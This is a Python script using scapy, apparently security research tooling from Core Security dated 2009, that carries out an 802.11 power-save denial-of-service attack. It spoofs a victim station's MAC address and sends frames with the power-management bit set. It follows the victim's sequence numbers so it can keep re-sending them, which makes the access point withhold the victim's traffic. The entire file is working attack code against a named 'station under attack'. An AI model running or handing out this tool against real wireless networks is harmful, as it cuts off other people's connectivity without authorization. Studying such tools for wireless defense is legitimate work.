#  Copyright (c) 2009 Core Security Technologies
#
#  Author: Leandro Meiners (lea@coresecurity.com)
# 
#  Permission to use, copy, modify, and distribute this software for any
#  purpose with or without fee is hereby granted, provided that the above
#  copyright notice and this permission notice appear in all copies.
# 
#  THE SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
#  WITH REGARD TO THIS SOFTWARE INCLUDING ALL IMPLIED WARRANTIES OF
#  MERCHANTABILITY AND FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
#  ANY SPECIAL, DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
#  WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN AN
#  ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
#  OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.

#!/usr/bin/env python

import sys
import signal, os
from scapy.config import *
from scapy.layers.dot11 import *
from scapy.utils import *
conf.verb=0

WIFI_MTU = 2346 # 802.11 maximum frame size is 2346 bytes (RFC 3580)
MAX_SN = 4096 # Max value for the 802.11 sequence number
MAX_FGNUM = 16 # Max value for the 802.11 fragment number field


def waitForBeacon(bssid):
	print "Waiting for Beacon from BSSID=[%s]" % bssid

        beacon = False
        #s = conf.L2listen()

        while not beacon:
                #p = s.recv(WIFI_MTU)
		p = sniff(count=1)[0]
                # check if beacon from the AP we want to connect to
                if p.haslayer(Dot11Beacon) and (p.addr3 == bssid):
                        beacon = True
                        cap = p.cap # AP capabilities
			l = p.getlayer(Dot11Elt)
			while l:
				if l.ID == 0: # SSID
					ssid = l.info
				if l.ID == 1: # rates
					rates = l.info
				l = l.payload

        		print "Beacon from BSSID=[%s] found (has SSID=[%s])" % (bssid, ssid)

        #s.close()
        return cap, ssid, rates


def extractFragN(sc):
	hexSC = '0' * (4 - len(hex(sc)[2:])) + hex(sc)[2:] # "normalize" to four digit hexadecimal number
	fgnum = int(hexSC[-1:], 16)
	return fgnum


def extractSN(sc):
	hexSC = '0' * (4 - len(hex(sc)[2:])) + hex(sc)[2:] # "normalize" to four digit hexadecimal number
	sn = int(hexSC[:-1], 16)
	return sn


def calculateSC(sn, fgnum = 0):
	if (fgnum > MAX_FGNUM): fgnum = 0
	if (sn > MAX_SN): sn = 0
	hexSN = hex(sn)[2:] + hex(fgnum)[2:]
	SC = int(hexSN, 16)
	return SC


def sentPacket(p, bssid, station):
	ret = (p.FCfield & 0x01 == 1) and (p.addr1 == bssid) and (p.addr2 == station) # FCfield & 0x01 checks to-DS
	return ret


def APsentPacket(p, bssid, station):
	# FCfield & 0x00 checks STA to STA or management or control frame
	ret = (p.FCfield & 0x00 == 0) and (p.addr1 == station) and (p.addr2 ==  bssid) and (p.addr3 == bssid)
	return ret


def receivedPacket(p, bssid, station):
	ret = (p.FCfield & 0x01 == 1) and (p.addr1 == bssid) and (p.addr3 == station) # FCfield & 0x01 checks to-DS
	return ret


def forwardedSentPacket(p, bssid, station):
	ret = (p.FCfield & 0x02 == 2) and (p.addr3 == station) and (p.addr2 == bssid) # FCfield & 0x02 checks from-DS
	return ret


def forwardedReceivedPacket(p, bssid, station):
	ret = (p.FCfield & 0x02 == 2) and (p.addr1 == station) and (p.addr2 == bssid) # FCfield & 0x02 checks from-DS
	return ret


def signalHandler(signum, frame):
        sys.exit(0)


def printFrameTypes():
        print "\tFrame type: reassoc | nullfunction | rts"
        print "\treassoc = Reassociation request frame"
        print "\tnullfunction = Null function (no data) frame"
        print "\tRTS = Request-to-send frame"
        print "\tprobereq = Probe request frame"


def main():
	if len(sys.argv) != 4 and len(sys.argv) != 5:
	    print "Usage: %s <interface> <station> <bssid> <frame type>" % sys.argv[0]
            printFrameTypes()
	    sys.exit(1)

	conf.iface = sys.argv[1]
	station = sys.argv[2].lower()
	bssid = sys.argv[3].lower()
	if len(sys.argv) == 5:
		frameType = sys.argv[4].lower()
		if frameType != "reassoc" and frameType != "nullfunction" and frameType != "rts" and frameType != "probereq":
			print "Incorrect frame type, valid values are:"
                        printFrameTypes()
			sys.exit(1)
	else:
		frameType = 'nullfunction'
	sn = 0
	fgnum = 0
	sc = calculateSC(sn)

	print "Entering main while loop, press Ctrl-C to quit"
	# main while loop
	s = conf.L2listen()

	#FIXME: Set duration on all frames

	ack = Dot11(type = 'Control', subtype = 29, addr1 = bssid, FCfield="pw-mgt")
	#SAVECAP:wrpcap("ack.cap", ack)

	if frameType == "reassoc":
		cap, ssid, rates = waitForBeacon(bssid)
		frame = Dot11(addr1 = bssid, addr2 = station, addr3 = bssid, FCfield = "to-DS+pw-mgt", SC = sc)
		frame = frame/Dot11ReassoReq(cap = cap, current_AP = bssid, listen_interval = 1)
		frame = frame/Dot11Elt(ID = 0, info = ssid) # SSID information field
		frame = frame/Dot11Elt(ID = 1, info = rates) # Rates information field

	if frameType == "nullfunction":
		frame = Dot11(type = 'Data', subtype = 4, addr1 = bssid, addr2 = station, addr3 = bssid, FCfield = "to-DS+pw-mgt", SC = sc, ID=20052)
		
	if frameType == "rts":
		frame = Dot11(type = 'Control', subtype = 11, addr1 = bssid, addr2 = station, FCfield = "to-DS+pw-mgt", SC = sc) 

	if frameType == "probereq":
		cap, ssid, rates = waitForBeacon(bssid)
		frame = Dot11(addr1 = bssid, addr2 = station, addr3 = bssid, FCfield = "to-DS+pw-mgt", SC = sc)/Dot11ProbeReq()
		frame = frame/Dot11Elt(ID = 0, info = ssid) # SSID information field
		frame = frame/Dot11Elt(ID = 1, info = rates) # Rates information field

	#SAVECAP:wrpcap("frame.cap", frame)
	
	sendp(frame)
	print "Sent power save packet"
	signal.signal(signal.SIGINT, signalHandler)

	while True:
		#p = s.recv(WIFI_MTU)
		p = sniff(count=1)[0]
		if p.haslayer(Dot11) and sentPacket(p, bssid, station) and p.FCfield & 0x03 == 0: # checks to see if frame sent has power bit unset
			print "Station under attack is still sending packets"
			print p.summary()
			#fgnum = extractFragN(p.SC)  	# extracts fragment number from frame
			sn = extractSN(p.SC) 		# extracts sequence number from frame
			sn = (sn + 1) % MAX_SN
			sc = calculateSC(sn)		# our frame is not fragmented (i.e. fgnum = 0)
			frame.SC = sc
			sendp(frame)
			print "Sent power save packet"

		if p.haslayer(Dot11) and forwardedSentPacket(p, bssid, station):
			print "Station under attack sent packets are being forwarded by the AP"
			print p.summary()

		if p.haslayer(Dot11) and receivedPacket(p, bssid, station):
			print "Station under attack is having packets sent to it"
			print p.summary()
		
		if p.haslayer(Dot11) and APsentPacket(p, bssid, station):
			print "Frame from AP to STA or STA to STA"
			print p.summary()
			if frameType == "probereq" and p.haslayer(Dot11ProbeResp):
				# We must ACK this frame as it can be a response to our Probe request
				print "Access point sent a Probe response, sending ACK"
				sendp(ack)		
	
			elif frameType == "reassoc" and p.haslayer(Dot11ReassoResp):
				# We must ACK this frame as it can be a response to our Reassociation request
				print "Access point sent a Reassociation response, sending ACK"
				sendp(ack)		

		if p.haslayer(Dot11) and forwardedReceivedPacket(p, bssid, station):
			print "Station under attack is still receiving packets (forwarded by the AP)"
			print p.summary()
			#fgnum = extractFragN(p.SC)  	# extracts fragment number from frame
			sn = extractSN(p.SC) 		# extracts sequence number from frame
			sn = (sn + 1) % MAX_SN
			sc = calculateSC(sn)		# our frame is not fragmented (i.e. fgnum = 0)
			frame.SC = sc
			sendp(frame)
			print "Sent power save packet"


if __name__ == "__main__":
	# Import Psyco if available
	try:
		import psyco
		psyco.full()
	except ImportError:
		pass

	main()
